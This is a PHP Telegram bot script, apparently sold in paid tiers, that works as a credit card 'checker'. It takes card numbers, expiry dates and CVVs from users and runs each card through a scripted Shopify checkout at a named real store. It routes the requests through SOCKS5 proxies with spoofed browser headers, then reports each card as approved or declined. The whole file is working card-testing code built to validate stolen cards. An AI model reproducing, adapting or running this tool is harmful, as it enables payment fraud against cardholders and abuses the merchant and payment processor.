<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');
//=========RANK DETERMINE=========//
$gate = "Shopify + Braintree 10$";
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";

$paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "OWNER";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "OWNER";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "PAID";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "PAID";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}

$gcm = ""
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//
$r = "0";

$r = rand(0, 100);
//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/sb|\.sb|!sb)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
        exit();
    }
    $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";
    $message = substr($message, 4);
    $messageidtoedit1 = bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "<b>REVIEWING YOU'RE REQUEST ✅</b>",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);
    $messageidtoedit = getstr(json_encode($messageidtoedit1), '"message_id":', ',');

    $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
    $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $amt = '1';
    if (empty($cc) || empty($cvv) || empty($mes) || empty($ano)) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "!𝙔𝙤𝙪 𝘿𝙪𝙢𝙗𝙤 𝘼𝙨𝙨 𝙃𝙤𝙡𝙚!\n𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>$gcm cc|mm|yy|cvv</code>\n𝙂𝙖𝙩𝙚𝙬𝙖𝙮 - <b>$gate</b>",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
        return;
    };
    if (strlen($ano) == '4') {
        $an = substr($ano, 2);
    } else {
        $an = $ano;
    }
    $amount = $amt * 100;
    //------------Card info------------//
    $lista = '' . $cc . '|' . $mes . '|' . $an . '|' . $cvv . '';


  $ch = curl_init();

  $bin = substr($cc, 0, 6);

  curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $ch = curl_init();

    $bin = substr($cc, 0, 6);

    curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $bindata = curl_exec($ch);
    $binna = json_decode($bindata, true);
    $brand = $binna['scheme'];
    $country = $binna['country']['name'];
    $alpha2 = $binna['country']['alpha2'];
    $emoji = $binna['country']['emoji'];
    $type = $binna['type'];
    $category = $binna['category'];
    $bank = $binna['bank']['name'];
    $url = $binna['bank']['url'];
    $phone = $binna['bank']['phone'];
    curl_close($ch);

    $bank = "$bank";
    $country = "$country $emoji ";
    $bin = "$bin - ($alpha2) -[$emoji] ";
    $bininfo = "$type - $brand - $category";
    $url = "$url";
    $type = strtoupper($type);

    //------------Card info------------//

  bot('editMessageText', [
          'chat_id' => $chat_id,
          'message_id' => $messageidtoedit,
          'text' => "<b>[×] PROCESS - ■□□□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>",
        'parse_mode' => 'html',
          'disable_web_page_preview' => 'true'
      ]);


    # -------------------- [1 REQ] -------------------#

    $proxie = null;
    $pass = null;
    $cookieFile = getcwd() . '/cookies.txt';

    function Capture2($str, $starting_word, $ending_word)
    {
        $subtring_start  = strpos($str, $starting_word);
        $subtring_start += strlen($starting_word);
        $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
        return substr($str, $subtring_start, $size);
    }


    $mes = ltrim($mes, '0');
    $ano = strlen($ano) == 2 ? '20' . $ano : $ano;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://random-data-api.com/api/v2/users?size=2&is_xml=true');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $randomuser = curl_exec($ch);
    curl_close($ch);
    $firstnme = trim(strip_tags(getstr($randomuser, '"first_name":"', '"')));
    $lastnme = trim(strip_tags(getstr($randomuser, '"last_name":"', '"')));


$site = "sprayerdepot.com";
//https://sprayerdepot.com/cart/1468128821256:1?traffic_source=buy_now

    #--- 1_REQ
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/cart/1468128821256:1?traffic_source=buy_now');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_HEADER, 1);
$headers = array();
$headers[] = 'Host: ' . $site . '';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$r1 = curl_exec($ch);
$shit = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL );
curl_close($ch);

$checkouts = trim(strip_tags(getStr($r1,'' . $site . '\/21366773\/checkouts\/','"')));
$token = trim(strip_tags(getStr($r1,'name="authenticity_token" value="','"')));

    $zo = Capture2($r1, '"pageurl":"', '?traffic_source=buy_now"');
    $partes = explode('\/', $zo);

    $id1 = $partes[1];
    $checkouts = $partes[3];
    #---- 2 REQ----

    echo "id $id1-- cehck $checkouts";

  bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => "<b>[×] PROCESS - ■■□□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>",
      'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/21366773/checkouts/'.$checkouts.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: ' . $site . '';
$headers[] = 'method: POST';
$headers[] = 'path: /21366773/checkouts/'.$checkouts.'';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://' . $site . '';
$headers[] = 'referer: https://' . $site . '/';
$headers[] = 'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token=' . $token . '&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=josewers20%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bbilling_address%5D%5Bfirst_name%5D=jhin&checkout%5Bbilling_address%5D%5Blast_name%5D=vega&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=street+212&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=new+york&checkout%5Bbilling_address%5D%5Bcountry%5D=US&checkout%5Bbilling_address%5D%5Bprovince%5D=New+York&checkout%5Bbilling_address%5D%5Bzip%5D=10080&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bfirst_name%5D=jhin&checkout%5Bbilling_address%5D%5Blast_name%5D=vega&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=street+212&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=new+york&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bprovince%5D=New+York&checkout%5Bbilling_address%5D%5Bzip%5D=10080&checkout%5Bbilling_address%5D%5Bphone%5D=9703878998&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&button=');
$r2 = curl_exec($ch);
curl_close($ch);

$token2 = trim(strip_tags(getStr($r2,'name="authenticity_token" value="','"')));
$shipping = trim(strip_tags(getStr($r2,'div class="radio-wrapper" data-shipping-method="','">')));

    echo "<hr>$token";

# -------------------- [3 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/21366773/checkouts/'.$checkouts.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: ' . $site . '';
$headers[] = 'method: POST';
$headers[] = 'path: /21366773/checkouts/'.$checkouts.'';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://' . $site . '';
$headers[] = 'referer: https://' . $site . '/';
$headers[] = 'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token=' . $token2 . '&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=usps-GroundAdvantage-8.08&checkout%5Bclient_details%5D%5Bbrowser_width%5D=486&checkout%5Bclient_details%5D%5Bbrowser_height%5D=931&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=420');
$r3 = curl_exec($ch);
curl_close($ch);

$token3 = trim(strip_tags(getStr($r3,'name="authenticity_token" value="','"')));
$total = trim(strip_tags(getStr($r3,'data-checkout-payment-due-target="','"')));


  bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => "<b>[×] PROCESS - ■■■□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>",
      'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);


# -------------------- [4 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: deposit.us.shopifycs.com';
$headers[] = 'Origin: https://checkout.shopifycs.com';
$headers[] = 'Referer: https://checkout.shopifycs.com/';
$headers[] = 'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$mes.',"year":'.$ano.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"Jon"},"payment_session_scope":"www.sprayerdepot.com"}');
$r4 = curl_exec($ch);
curl_close($ch);
$sid = trim(strip_tags(getStr($r4,'{"id":"','"}')));


    echo "sid: $sid";



    #------- 5 REQ

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/21366773/checkouts/'.$checkouts.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: ' . $site . '';
$headers[] = 'method: POST';
$headers[] = 'path: /21366773/checkouts/'.$checkouts.'';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: es-PE,es;q=0.9';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://' . $site . '';
$headers[] = 'referer: https://' . $site . '/';
$headers[] = 'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token=' . $token3 . '&previous_step=payment_method&step=&s=' . $sid . '&checkout%5Bpayment_gateway%5D=68297719875&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Battributes%5D%5Bterms_and_conditions%5D=true&checkout%5Btotal_price%5D=1005&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=486&checkout%5Bclient_details%5D%5Bbrowser_height%5D=931&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=420');
$r5 = curl_exec($ch);
sleep(5);
curl_close($ch);

    #---- 6 REQ


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/21366773/checkouts/'.$checkouts.'/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_HEADER, 1);
$headers = array();
$headers[] = 'Host: ' . $site . '';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
sleep(2);
$r6 = curl_exec($ch);
$shit2 = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL );
curl_close($ch);


  bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => "<b>[×] PROCESS - ■■■■
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>",
      'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);


    $msg = trim(strip_tags(getstr($r6, 'class="notice__content"><p class="notice__text">', '</p></div></div>')));

if (strpos($r6, 'Security code was not matched by the processor') || strpos($r6, 'Security codes does not match correct format (3-4 digits)')) {
$es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
} elseif (strpos($r6, 'Your order is confirmed') || strpos($r6, 'Thanks for supporting') || strpos($r6, '<div class="webform-confirmation">')) {
  $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
  $msg = "$msg";
   } elseif (strpos($r6, 'Insufficient'))  {
  $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";

        } elseif (strpos($r6, "Card was declined")) {
  $es = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌";
  $msg = "$msg";
        } elseif (strpos($r6, "The merchant does not accept this type of credit card")) {
  $es = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌";
  $msg = "$msg";
  } else {
  $es = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌";
      $msg = "$msg";
  }




    $end_time = microtime(true);
    $time = number_format($end_time - $start_time, 2);
    ////////--[Responses]--////////


    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => "$es

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>$gate</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu",
        'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);
}
